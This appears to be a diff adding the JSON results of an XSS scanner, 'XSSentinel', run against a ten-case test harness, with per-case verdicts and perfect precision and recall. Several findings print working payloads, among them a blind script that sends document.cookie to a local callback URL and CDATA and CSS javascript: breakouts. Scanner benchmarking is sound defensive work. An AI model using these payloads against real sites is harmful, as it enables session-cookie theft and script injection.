@@ -1,0 +1,306 @@
+{
+  "tool": "XSSentinel",
+  "engine": "sync",
+  "timestamp": "2026-09-30 00:57:00",
+  "total_cases": 10,
+  "total_time_s": 231.01,
+  "tp": 5,
+  "fp": 0,
+  "tn": 5,
+  "fn": 0,
+  "errors": 0,
+  "recall": 1.0,
+  "precision": 1.0,
+  "fpr": 0.0,
+  "f1": 1.0,
+  "cases": [
+    {
+      "case_id": "pos-dangle-01",
+      "path": "/r/dgl01",
+      "param": "q",
+      "mode": "dangling_vuln",
+      "ground_truth": "vulnerable",
+      "context": "attribute",
+      "difficulty": "hard",
+      "detected": true,
+      "verdict": "TP",
+      "scan_time_s": 0.961,
+      "findings_count": 1,
+      "requests": 59,
+      "finding_details": [
+        {
+          "type": "dangling_markup_potential",
+          "payload": "(DanglingMarkup: dangling_markup_potential)",
+          "context": "dangling_dangling_markup_potential",
+          "severity": "medium",
+          "confidence": "high"
+        }
+      ],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "pos-blind-01",
+      "path": "/r/bo01",
+      "param": "q",
+      "mode": "blind_vuln",
+      "ground_truth": "vulnerable",
+      "context": "blind_oob",
+      "difficulty": "hard",
+      "detected": true,
+      "verdict": "TP",
+      "scan_time_s": 3.316,
+      "findings_count": 1,
+      "requests": 61,
+      "finding_details": [
+        {
+          "type": "blind",
+          "payload": "<script>new Image().src='http://127.0.0.1:8900/xssv_1913d23ce5a3/?c='+encodeURIComponent(document.cookie)</script>",
+          "context": "blind_oob",
+          "severity": "high",
+          "confidence": "high"
+        }
+      ],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "pos-cdata-01",
+      "path": "/r/cdata01",
+      "param": "q",
+      "mode": "raw_cdata",
+      "ground_truth": "vulnerable",
+      "context": "cdata",
+      "difficulty": "hard",
+      "detected": true,
+      "verdict": "TP",
+      "scan_time_s": 0.947,
+      "findings_count": 1,
+      "requests": 59,
+      "finding_details": [
+        {
+          "type": "reflected",
+          "payload": "]]></script><script>alert('xssv_99da7fe5')</script><![CDATA[",
+          "context": "cdata",
+          "severity": "high",
+          "confidence": "high"
+        }
+      ],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "pos-attr-08",
+      "path": "/r/attr08",
+      "param": "q",
+      "mode": "raw_attr_dq_style",
+      "ground_truth": "vulnerable",
+      "context": "css_context",
+      "difficulty": "hard",
+      "detected": true,
+      "verdict": "TP",
+      "scan_time_s": 0.926,
+      "findings_count": 1,
+      "requests": 59,
+      "finding_details": [
+        {
+          "type": "reflected",
+          "payload": "background:url(javascript:alert('xssv_6290e1bb'))",
+          "context": "css_context",
+          "severity": "high",
+          "confidence": "high"
+        }
+      ],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "pos-proto-01",
+      "path": "/r/prt01",
+      "param": "q",
+      "mode": "prototype_vuln",
+      "ground_truth": "vulnerable",
+      "context": "dom_prototype",
+      "difficulty": "hard",
+      "detected": true,
+      "verdict": "TP",
+      "scan_time_s": 8.199,
+      "findings_count": 1,
+      "requests": 54,
+      "finding_details": [
+        {
+          "type": "prototype_pollution",
+          "payload": "(prototype pollution)",
+          "context": "dom_prototype",
+          "severity": "high",
+          "confidence": "high"
+        }
+      ],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "neg-dangle-01",
+      "path": "/s/dgl01",
+      "param": "q",
+      "mode": "dangling_safe",
+      "ground_truth": "safe",
+      "context": "attribute",
+      "difficulty": "hard",
+      "detected": false,
+      "verdict": "TN",
+      "scan_time_s": 0.961,
+      "findings_count": 0,
+      "requests": 68,
+      "finding_details": [],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "neg-blind-01",
+      "path": "/s/bo01",
+      "param": "q",
+      "mode": "blind_safe",
+      "ground_truth": "safe",
+      "context": "blind_oob",
+      "difficulty": "hard",
+      "detected": false,
+      "verdict": "TN",
+      "scan_time_s": 19.482,
+      "findings_count": 0,
+      "requests": 78,
+      "finding_details": [],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "neg-cssi-01",
+      "path": "/s/cssi01",
+      "param": "",
+      "mode": "cssi_safe",
+      "ground_truth": "safe",
+      "context": "css_context",
+      "difficulty": "medium",
+      "detected": false,
+      "verdict": "TN",
+      "scan_time_s": 0.427,
+      "findings_count": 0,
+      "requests": 52,
+      "finding_details": [],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "neg-proto-01",
+      "path": "/s/prt01",
+      "param": "q",
+      "mode": "prototype_safe",
+      "ground_truth": "safe",
+      "context": "dom_prototype",
+      "difficulty": "hard",
+      "detected": false,
+      "verdict": "TN",
+      "scan_time_s": 187.658,
+      "findings_count": 0,
+      "requests": 53,
+      "finding_details": [],
+      "error": "",
+      "retries": 0
+    },
+    {
+      "case_id": "neg-dom-07",
+      "path": "/dom/hash-route-safe#/route",
+      "param": "q",
+      "mode": "dom_hash_route_safe",
+      "ground_truth": "safe",
+      "context": "dom_xss",
+      "difficulty": "medium",
+      "detected": false,
+      "verdict": "TN",
+      "scan_time_s": 8.124,
+      "findings_count": 0,
+      "requests": 52,
+      "finding_details": [],
+      "error": "",
+      "retries": 0
+    }
+  ],
+  "by_context": {
+    "attribute": {
+      "tp": 1,
+      "fp": 0,
+      "tn": 1,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 2
+    },
+    "blind_oob": {
+      "tp": 1,
+      "fp": 0,
+      "tn": 1,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 2
+    },
+    "cdata": {
+      "tp": 1,
+      "fp": 0,
+      "tn": 0,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 1
+    },
+    "css_context": {
+      "tp": 1,
+      "fp": 0,
+      "tn": 1,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 2
+    },
+    "dom_prototype": {
+      "tp": 1,
+      "fp": 0,
+      "tn": 1,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 2
+    },
+    "dom_xss": {
+      "tp": 0,
+      "fp": 0,
+      "tn": 1,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 1
+    }
+  },
+  "by_difficulty": {
+    "hard": {
+      "tp": 5,
+      "fp": 0,
+      "tn": 3,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 8
+    },
+    "medium": {
+      "tp": 0,
+      "fp": 0,
+      "tn": 2,
+      "fn": 0,
+      "error": 0,
+      "skip": 0,
+      "total": 2
+    }
+  },
+  "false_positives": [],
+  "false_negatives": []
+}
